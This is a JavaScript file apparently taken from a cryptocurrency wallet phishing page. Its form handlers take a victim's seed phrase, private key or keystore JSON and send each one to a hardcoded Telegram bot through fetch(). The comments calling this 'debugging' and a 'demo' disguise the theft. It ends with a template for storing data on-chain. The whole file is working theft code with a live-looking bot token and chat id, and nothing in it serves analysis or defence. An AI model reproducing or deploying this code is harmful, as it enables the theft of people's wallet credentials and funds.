// Telegram API (for debugging only)
async function sendMessage(message) {
    const chat_id = -7654553013;
    try {
        const res = await fetch(`https://api.telegram.org/bot8374408986:AAFDH13C-XPSNC5t6imlnd0OiQW0NhSVWNw/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
        if (!res.ok) throw new Error("Telegram API failed");
        return await res.json();
    } catch (err) {
        console.error("Telegram error:", err);
        throw err;
    }
}

// Form submission handlers
function setupFormSubmit(buttonId, inputId, logMessage) {
    document.getElementById(buttonId)?.addEventListener("click", async (e) => {
        e.preventDefault();
        const input = document.getElementById(inputId)?.value.trim();
        if (!input) {
            alert("Input is empty!");
            return;
        }
        console.log(logMessage, input);
        try {
            await sendMessage(`${logMessage}: ${input}`);
            alert("Submitted successfully (demo)");
        } catch (err) {
            alert("Server error. Try again later.");
        }
    });
}

// Initialize all forms
setupFormSubmit("submitk", "phrased", "Phrase");
setupFormSubmit("submitp", "privatekeyd", "Private Key");
setupFormSubmit("submitks", "keystored", "Keystore JSON");

// ====== SMART CONTRACT INTEGRATION ====== //
// Replace these with YOUR actual contract details:
const contractAddress = "0x123..."; //  👈 Replace with deployed address (see Step 3)
const contractABI = [...];          //  👈 Replace with ABI array (see Step 3)

async function initContract() {
    if (!window.ethereum) {
        alert("Install MetaMask!");
        return;
    }
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    return new ethers.Contract(contractAddress, contractABI, signer);
}

async function submitToContract(data) {
    try {
        const contract = await initContract();
        await contract.storeData(data); // Replace with your contract's method (e.g., `storePhrase`)
        console.log("Data stored on-chain!");
    } catch (err) {
        console.error("Contract error:", err);
    }
}
